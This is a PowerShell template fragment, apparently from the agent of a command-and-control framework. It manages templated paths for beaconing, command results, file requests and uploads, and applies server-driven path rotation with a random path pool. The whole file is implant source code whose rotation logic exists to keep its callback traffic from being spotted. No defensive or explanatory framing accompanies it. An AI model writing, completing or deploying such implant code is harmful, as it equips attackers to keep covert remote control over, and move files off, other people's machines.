# Path rotation configuration
$global:pathRotationEnabled = $true
$global:currentRotationId = {{ROTATION_ID}}
$global:nextRotationTime = {{NEXT_ROTATION_TIME}}
$global:rotationInterval = {{ROTATION_INTERVAL}}

# Store initial paths
$global:initialPaths = @{
    "beacon_path" = "{{BEACON_PATH}}";
    "cmd_result_path" = "{{CMD_RESULT_PATH}}";
    "file_request_path" = "{{FILE_REQUEST_PATH}}";
    "file_upload_path" = "{{FILE_UPLOAD_PATH}}";
}

# Store path pool for modular operation
$global:pathPool = @()

# Store current paths
$global:currentPaths = $global:initialPaths.Clone()

# Function to handle path rotation updates from server
function Update-PathRotation {
    param(
        [int]$RotationId,
        [int]$NextRotationTime,
        [hashtable]$Paths
    )
    
    $global:currentRotationId = $RotationId
    $global:nextRotationTime = $NextRotationTime
    
    # Update paths if provided
    if ($Paths -and $Paths.Count -gt 0) {
        $global:currentPaths = @{}
        $global:pathPool = @()
        
        foreach ($key in $Paths.Keys) {
            if ($key -eq "beacon_path" -or $key -eq "cmd_result_path" -or $key -eq "file_request_path" -or $key -eq "file_upload_path") {
                $global:currentPaths[$key] = $Paths[$key]
                Write-Host "Updated path $key to: $($Paths[$key])"
            }
            elseif ($key -eq "path_pool") {
                # Store the path pool for random selection
                if ($Paths[$key] -is [array]) {
                    $global:pathPool = $Paths[$key]
                    Write-Host "Updated path pool with $($global:pathPool.Count) paths"
                }
                else {
                    Write-Host "Warning: path_pool is not an array, skipping"
                }
            }
        }
    }
    
    # Log the rotation
    $nextTime = [DateTimeOffset]::FromUnixTimeSeconds($NextRotationTime).DateTime.ToString('yyyy-MM-dd HH:mm:ss')
    Write-Host "Path rotation updated: ID $RotationId, next rotation at $nextTime"
}

# Function to get a random path from the pool
function Get-RandomPath {
    if ($global:pathPool -and $global:pathPool.Count -gt 0) {
        # Select a random path from the pool
        $randomIndex = Get-Random -Minimum 0 -Maximum $global:pathPool.Count
        $path = $global:pathPool[$randomIndex]
        Write-Verbose "Using random path from pool: $path"
        return $path
    }
    
    # Fallback to a default path if pool is empty
    return Get-CurrentPath -PathType "beacon_path"
}

# Function to get the current path by type
function Get-CurrentPath {
    param([string]$PathType)
    
    # First look in current paths (rotated)
    if ($global:currentPaths.ContainsKey($PathType)) {
        $path = $global:currentPaths[$PathType]
        if (-not [string]::IsNullOrEmpty($path)) {Write-Verbose "Using current path for ${PathType}: $path"
            return $path
        }
    }
    
    # Then try initial paths
    if ($global:initialPaths.ContainsKey($PathType)) {
        $path = $global:initialPaths[$PathType]
        if (-not [string]::IsNullOrEmpty($path)) {
            Write-Verbose "Using initial path for ${PathType}: $path"
            return $path
        }
    }
    
    # If we get here, we don't have a valid path - throw error instead of using fallbacks
    $errorMsg = "ERROR: No valid path found for '${PathType}'. Dynamic path rotation requires all paths."
    Write-Host $errorMsg
    throw $errorMsg
}

# Function to check if rotation is needed
function Check-PathRotation {
    $currentTime = [int][double]::Parse((Get-Date -UFormat %s))
    
    # Check if we're past rotation time
    if ($global:pathRotationEnabled -and $currentTime -ge $global:nextRotationTime) {
        # We need to get rotations info from server ASAP
        Write-Host "Rotation time reached, waiting for update from server..."
        return $true
    }
    
    return $false
}